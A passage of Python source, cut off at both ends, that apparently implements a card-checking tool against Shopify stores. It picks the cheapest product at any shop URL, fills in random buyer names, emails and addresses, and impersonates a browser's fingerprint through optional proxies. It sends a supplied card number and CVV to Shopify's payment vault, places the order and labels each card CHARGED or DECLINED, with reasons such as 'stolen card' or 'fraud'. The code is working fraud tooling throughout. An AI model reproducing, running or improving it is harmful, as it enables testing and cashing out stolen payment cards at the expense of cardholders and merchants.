    return match.group(1) if match else ""


def extract_receipt_session_token(submit_body: str) -> str:
    match = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""


def extract_payment_method_id(proposal_body: str) -> str:
    match = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"', proposal_body)
    return match.group(1) if match else ""


# ──────────────────────── Error mapping & extraction ─────────────────

_SHOPIFY_ERROR_MAP: Dict[str, str] = {
    "risky": "RISK_REJECTED", "risk": "RISK_REJECTED", "fraud": "RISK_REJECTED",
    "suspected fraud": "RISK_REJECTED",
    "do not honor": "DO_NOT_HONOR", "do_not_honor": "DO_NOT_HONOR",
    "insufficient funds": "INSUFFICIENT_FUNDS", "insufficient_funds": "INSUFFICIENT_FUNDS",
    "card declined": "CARD_DECLINED", "card_declined": "CARD_DECLINED",
    "invalid card": "CARD_INVALID", "invalid_card": "CARD_INVALID",
    "expired card": "CARD_EXPIRED", "card expired": "CARD_EXPIRED",
    "incorrect cvc": "CVV_INVALID", "incorrect_cvc": "CVV_INVALID",
    "security code": "CVV_INVALID",
    "stolen card": "CARD_STOLEN", "lost card": "CARD_STOLEN", "pickup card": "CARD_STOLEN",
    "address": "ADDRESS_INVALID", "zip": "ZIP_INVALID", "postal": "ZIP_INVALID",
    "throttled": "RATE_LIMITED", "too many": "RATE_LIMITED", "rate limit": "RATE_LIMITED",
    "gateway": "GATEWAY_ERROR", "processing error": "GATEWAY_ERROR",
    "inventory": "OUT_OF_STOCK", "out of stock": "OUT_OF_STOCK", "unavailable": "OUT_OF_STOCK",
    "captcha": "CAPTCHA_REQUIRED",
    "terms": "TERMS_REQUIRED",
    "payment method": "PAYMENT_METHOD_INVALID",
}


def _map_error(raw: str) -> str:
    low = raw.lower()
    for keyword, code in _SHOPIFY_ERROR_MAP.items():
        if keyword in low:
            return code
    return raw.upper().replace(" ", "_")[:40]


def extract_any_error(submit_body: str) -> str:
    for pattern in [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]:
        match = re.search(pattern, submit_body)
        if match:
            return _map_error(match.group(1))
    return ""


def extract_submit_error(submit_body: str) -> str:
    match = re.search(r'"nonLocalizedMessage"\s*:\s*"([^"]+)"', submit_body)
    if match:
        return match.group(1)
    match = re.search(r'"code"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""


def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
    if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
        return "ORDER_PLACED"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if match:
        code = match.group(1)
        if "CAPTCHA" in code:
            return "CAPTCHA_REQUIRED"
        return code
    if "CAPTCHA" in poll_body:
        return "CAPTCHA_REQUIRED"
    if receipt_type == "FailedReceipt":
        return "FAILED"
    return "UNKNOWN"


def detect_shipping_restriction(proposal_body: str) -> bool:
    restriction_signals = [
        "SHIPPING_ADDRESS_UNDELIVERABLE",
        "no_delivery_options_available",
        "noDeliveryOptionsAvailable",
        "delivery is not available",
        "does not ship to",
    ]
    lower = proposal_body.lower()
    return any(s.lower() in lower for s in restriction_signals)


# ──────────────────────── Payload helpers ────────────────────────────

def patch_payload(payload: str, currency: str, country: str) -> str:
    if currency == "USD" and country == "US":
        return payload
    try:
        data = json.loads(payload)
    except json.JSONDecodeError:
        logger.error("patch_payload: JSON parse failed — falling back to string replace")
        if currency != "USD":
            payload = payload.replace('"currencyCode":"USD"', f'"currencyCode":"{currency}"')
            payload = payload.replace('"presentmentCurrency":"USD"', f'"presentmentCurrency":"{currency}"')
        if country != "US":
            payload = payload.replace('"phoneCountryCode":"US"', f'"phoneCountryCode":"{country}"')
        return payload

    def _walk(obj: object) -> object:
        if isinstance(obj, dict):
            patched: Dict = {}
            for k, v in obj.items():
                if k == "presentmentCurrency" and v == "USD" and currency != "USD":
                    patched[k] = currency
                elif k == "phoneCountryCode" and v == "US" and country != "US":
                    patched[k] = country
                elif k == "countryCode" and v == "US" and country != "US" and _in_buyer_identity[0]:
                    patched[k] = country
                elif k == "customer":
                    _in_buyer_identity[0] = True
                    patched[k] = _walk(v)
                    _in_buyer_identity[0] = False
                else:
                    patched[k] = _walk(v)
            return patched
        if isinstance(obj, list):
            return [_walk(i) for i in obj]
        return obj

    _in_buyer_identity = [False]
    patched_data = _walk(data)
    return json.dumps(patched_data, separators=(",", ":"))


def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"


def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"


# ──────────────────────── Step 9: PCI tokenisation ───────────────────

def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     card_month: int, card_year: int, cvv: str,
                     shop_domain: str, proxy_url: str = "",
                     vault_url: str = "", vault_domain: str = "",
                     impersonate: str = "chrome124") -> Tuple[int, str]:
    _DEFAULT_VAULT = "https://checkout.pci.shopifyinc.com/sessions"
    endpoint = vault_url or _DEFAULT_VAULT
    scope = vault_domain or shop_domain
    origin_base = endpoint.rsplit("/sessions", 1)[0] if "/sessions" in endpoint else "https://checkout.pci.shopifyinc.com"
    payload = json.dumps({
        "credit_card": {
            "number": card_number,
            "month": card_month,
            "year": card_year,
            "verification_value": cvv,
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": card_name,
        },
        "payment_session_scope": scope,
    })
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": origin_base,
        "priority": "u=1, i",
        "referer": f"{origin_base}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    with Session(impersonate=impersonate) as session:
        post_kwargs = {"data": payload, "headers": headers, "timeout": 20}
        if proxy_url:
            post_kwargs["proxy"] = proxy_url
        with _GLOBAL_SEM:
            resp = session.post(endpoint, **post_kwargs)
    return resp.status_code, resp.text


# ──────────────────────── Proposal headers ───────────────────────────

def _proposal_headers(shop_url: str, checkout_url: str, checkout_token: str,
                      session_token: str, build_id: str, source_token: str) -> Dict:
    return {
        "accept": "application/json",
        "accept-language": "en-US",
        "content-type": "application/json",
        "origin": shop_url,
        "priority": "u=1, i",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": build_id,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": source_token,
    }


# ──────────────────────── Step 4: Proposal 1 ─────────────────────────

def send_proposal(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                  session_token: str, stable_id: str, variant_id: str, price: str,
                  proposal_id: str, build_id: str, source_token: str,
                  currency: str, country: str) -> Tuple[int, str]:
    addr = pick_address_for_store(shop_url, currency, country)
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}", "address2": "{addr.address2}",
          "city": "{addr.city}", "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


# ──────────────────────── Step 5: Proposal 2 (email) ─────────────────

def send_proposal2(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, currency: str, country: str) -> Tuple[int, str]:
    addr = pick_address_for_store(shop_url, currency, country)
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}", "address2": "{addr.address2}",
          "city": "{addr.city}", "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [{{"email": {{"value": "{email}"}}}}],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


# ──────────────────────── Step 6: Proposal 3 (address) ───────────────

def send_proposal3(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, addr: Address, currency: str, country: str) -> Tuple[int, str]:
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


# ──────────────────────── Public wrapper ─────────────────────────────

def run_checkout_public(card_number: str, exp_month: int, exp_year: int, cvv: str,
                        shop_url: str, proxy_url: str = "",
                        currency: str = "USD", country: str = "US",
                        card_name: str = "") -> CheckResult:
    """
    High-level public entrypoint.
    Returns a CheckResult with .status (CheckStatus enum), .status_code,
    .amount, .currency, .receipt_url, and .error (if any).
    """
    card_display = f"{card_number[:6]}****{card_number[-4:]}"

    if not card_name:
        card_name = random.choice(FIRST_NAMES).title() + " " + random.choice(LAST_NAMES).title()

    client = None
    try:
        client = TLSClient(timeout=30, proxy_url=proxy_url or None)

        # Step 0: find cheapest product
        title, product_id, variant_id, price = find_cheapest_product(client, shop_url)

        # Step 1: cart → checkout
        checkout_url, checkout_token, session_token, checkout_html = add_to_cart_and_checkout(
            client, shop_url, variant_id
        )

        # Step 2: private access token
        pat_id = extract_private_access_token_id(checkout_html)
        pat_resp = fetch_private_access_token(client, shop_url, checkout_url, pat_id)

        # Step 3: actions JS
        actions_url = extract_actions_js_url(checkout_html, shop_url)
        if not actions_url:
            raise Exception("could not locate actions JS bundle")
        actions_js = fetch_actions_js(client, actions_url, shop_url)

        proposal_id = extract_proposal_id(actions_js)
        submit_id = extract_submit_for_completion_id(actions_js)
        poll_id = extract_poll_for_receipt_id(actions_js)

        if not proposal_id:
            raise Exception("could not extract Proposal operation id")
        if not submit_id:
            raise Exception("could not extract SubmitForCompletion operation id")

        # Extract stable_id, build_id, source_token
        stable_id = extract_stable_id(checkout_html)
        build_id = extract_commit_sha(checkout_html) or "unknown"
        source_token = extract_source_token(checkout_html)
        if not stable_id:
            raise Exception("could not extract stableId from checkout HTML")

        # Step 4: Proposal 1 (no email)
        p1_status, p1_body = send_proposal(
            client, shop_url, checkout_url, checkout_token,
            session_token, stable_id, variant_id, price,
            proposal_id, build_id, source_token, currency, country
        )
        if p1_status != 200:
            raise Exception(f"Proposal #1 returned HTTP {p1_status}")

        queue_token = extract_queue_token(p1_body) or ""

        # Step 5: Proposal 2 (email)
        email = generate_random_email()
        p2_status, p2_body = send_proposal2(
            client, shop_url, checkout_url, checkout_token,
            session_token, stable_id, variant_id, price,
            proposal_id, build_id, source_token, queue_token,
            email, currency, country
        )
        if p2_status != 200:
            raise Exception(f"Proposal #2 returned HTTP {p2_status}")

        # Step 6: Proposal 3 (address)
        addr = pick_address_for_store(shop_url, currency, country)
        p3_status, p3_body = send_proposal3(
            client, shop_url, checkout_url, checkout_token,
            session_token, stable_id, variant_id, price,
            proposal_id, build_id, source_token, queue_token,
            email, addr, currency, country
        )
        if p3_status != 200:
            raise Exception(f"Proposal #3 returned HTTP {p3_status}")

        if detect_shipping_restriction(p3_body):
            for fallback_addr in get_fallback_addresses(country):
                p3_status, p3_body = send_proposal3(
                    client, shop_url, checkout_url, checkout_token,
                    session_token, stable_id, variant_id, price,
                    proposal_id, build_id, source_token, queue_token,
                    email, fallback_addr, currency, fallback_addr.country_code
                )
                if p3_status == 200 and not detect_shipping_restriction(p3_body):
                    addr = fallback_addr
                    break

        # Step 7: extract PCI session info and tokenise card
        ident_sig = extract_identification_signature(checkout_html)
        vault_url = extract_vault_url(checkout_html)
        vault_domain = extract_vault_domain(checkout_html)
        if not ident_sig:
            raise Exception("could not extract identification signature")

        pci_status, pci_body = send_pci_session(
            ident_sig, card_number, card_name, exp_month, exp_year, cvv,
            shop_url, proxy_url=proxy_url, vault_url=vault_url,
            vault_domain=vault_domain
        )
        if pci_status != 200:
            raise Exception(f"PCI session returned HTTP {pci_status}")

        pci_session_id = extract_pci_session_id(pci_body)
        if not pci_session_id:
            raise Exception("could not extract PCI session id")

        # Step 8: submit for completion
        payment_method_id = extract_payment_method_id(p3_body)
        if not payment_method_id:
            raise Exception("could not extract payment method id from proposal")

        submit_payload = json.dumps({
            "variables": {
                "sessionInput": {"sessionToken": session_token},
                "queueToken": queue_token,
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "partialStreetAddress": {
                                "address1": addr.address1,
                                "address2": addr.address2,
                                "city": addr.city,
                                "countryCode": addr.country_code,
                                "postalCode": addr.postal_code,
                                "firstName": addr.first_name,
                                "lastName": addr.last_name,
                                "zoneCode": addr.zone_code,
                                "phone": addr.phone,
                                "oneTimeUse": False
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyMatchingConditions": {
                                "estimatedTimeInTransit": {"any": True},
                                "shipments": {"any": True}
                            },
                            "options": {}
                        },
                        "targetMerchandiseLines": {"any": True},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": False
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True
                },
                "deliveryExpectations": {"deliveryExpectationLines": []},
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [], "sellingPlanId": None, "sellingPlanDigest": None
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": []
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "id": payment_method_id,
                            "name": "shopify_payments",
                            "sessionId": pci_session_id,
                            "paymentMethodIdentifier": payment_method_id
                        },
                        "amount": {"any": True}
                    }],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": addr.address1,
                            "address2": addr.address2,
                            "city": addr.city,
                            "countryCode": addr.country_code,
                            "postalCode": addr.postal_code,
                            "firstName": addr.first_name,
                            "lastName": addr.last_name,
                            "zoneCode": addr.zone_code,
                            "phone": addr.phone
                        }
                    }
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency, "countryCode": country},
                    "email": email,
                    "emailChanged": False,
                    "phoneCountryCode": country,
                    "marketingConsent": [],
                    "shopPayOptInPhone": {"countryCode": country},
                    "rememberMe": False
                },
                "tip": {"tipLines": []},
                "poNumber": None,
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"any": True},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": []
                },
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None, "signatureUuid": None,
                    "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "cartMetafields": []
            },
            "operationName": "SubmitForCompletion",
            "id": submit_id
        }, separators=(",", ":"))

        submit_headers = _proposal_headers(
            shop_url, checkout_url, checkout_token,
            session_token, build_id, source_token
        )
        submit_resp = client.post(
            f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
            data=submit_payload,
            headers=submit_headers
        )

        if submit_resp.status_code not in (200, 201, 202):
            return CheckResult(
                card=card_display,
                status=CheckStatus.ERROR,
                status_code=f"HTTP_{submit_resp.status_code}",
                amount=price,
                currency=currency,
                site_name=shop_url,
                shop_url=shop_url,
                error=Exception(f"SubmitForCompletion returned {submit_resp.status_code}"),
                retryable=True,
            )

        submit_body = submit_resp.text
        receipt_id = extract_receipt_id(submit_body)
        receipt_session_token = extract_receipt_session_token(submit_body) or session_token

        # Step 9: poll for receipt
        poll_status_code = "UNKNOWN"
        receipt_url = ""
        amount = price
        used_currency = currency

        if receipt_id and poll_id:
            poll_payload = json.dumps({
                "variables": {
                    "receiptId": receipt_id,
                    "sessionToken": receipt_session_token
                },
                "operationName": "PollForReceipt",
                "id": poll_id
            }, separators=(",", ":"))

            max_attempts = 12
            for attempt in range(max_attempts):
                try:
                    poll_resp = client.post(
                        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=PollForReceipt",
                        data=poll_payload,
                        headers=submit_headers
                    )
                    if poll_resp.status_code != 200:
                        time.sleep(1.5)
                        continue

                    poll_body = poll_resp.text

                    # Check for hard declines first
                    error_msg = extract_submit_error(poll_body)
                    if error_msg and any(kw in error_msg.lower() for kw in
                                         ["declined", "insufficient", "invalid", "expired", "cvv",
                                          "risky", "fraud", "stolen", "pickup"]):
                        status_code = _map_error(error_msg)
                        return CheckResult(
                            card=card_display,
                            status=CheckStatus.DECLINED,
                            status_code=status_code,
                            amount=amount,
                            currency=used_currency,
                            site_name=shop_url,
                            shop_url=shop_url,
                        )

                    # Detect receipt type
                    receipt_type = ""
                    m = re.search(r'"__typename"\s*:\s*"(\w+Receipt)"', poll_body)
                    if m:
                        receipt_type = m.group(1)

                    if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
                        status_code = "ORDER_PLACED"
                    elif receipt_type == "ProcessingReceipt":
                        status_code = "PROCESSING"
                        time.sleep(2.0)
                        continue
                    elif receipt_type == "FailedReceipt":
                        status_code = "FAILED"
                    else:
                        status_code = extract_receipt_status_code(poll_body, receipt_type)

                    # Verify it's a real charge
                    is_charged, conf_url = is_real_charge(poll_body)
                    if is_charged:
                        return CheckResult(
                            card=card_display,
                            status=CheckStatus.CHARGED,
                            status_code="ORDER_PLACED",
                            amount=amount,
                            currency=used_currency,
                            site_name=shop_url,
                            shop_url=shop_url,
                            receipt_url=conf_url or "",
                        )

                    # Extract amount from poll if available
                    amt_match = re.search(r'"totalAmountToPay"\s*:\s*\{[^}]*?"amount"\s*:\s*"([^"]+)"', poll_body)
                    if amt_match:
                        amount = amt_match.group(1)

                    # Continue polling for processing receipts
                    if status_code in ("PROCESSING", "UNKNOWN"):
                        time.sleep(2.0)
                        continue

                    # If we got a terminal status that isn't a real charge
                    if status_code in ("FAILED", "ORDER_PLACED"):
                        return CheckResult(
                            card=card_display,
                            status=CheckStatus.DECLINED if status_code == "FAILED" else CheckStatus.CHARGED,
                            status_code=status_code,
                            amount=amount,
                            currency=used_currency,
                            site_name=shop_url,
                            shop_url=shop_url,
                            receipt_url=receipt_url,
                        )

                except Exception as poll_exc:
                    logger.debug("Poll attempt %d error: %r", attempt, poll_exc)

                time.sleep(1.5)

            # Exhausted polling
            poll_status_code = "POLL_TIMEOUT"

        # If we reach here without a real charge confirmation
        # Try to extract any error from submit
        submit_error = extract_submit_error(submit_body)
        if submit_error:
            mapped = _map_error(submit_error)
            return CheckResult(
                card=card_display,
                status=CheckStatus.DECLINED,
                status_code=mapped,
                amount=price,
                currency=currency,
                site_name=shop_url,
                shop_url=shop_url,
            )

        # Fallback: check if submit body itself indicates success
        is_charged, conf_url = is_real_charge(submit_body)
        if is_charged:
            return CheckResult(
                card=card_display,
                status=CheckStatus.CHARGED,
                status_code="ORDER_PLACED",
                amount=price,
                currency=currency,
                site_name=shop_url,
                shop_url=shop_url,
                receipt_url=conf_url or "",
            )

        return CheckResult(
            card=card_display,
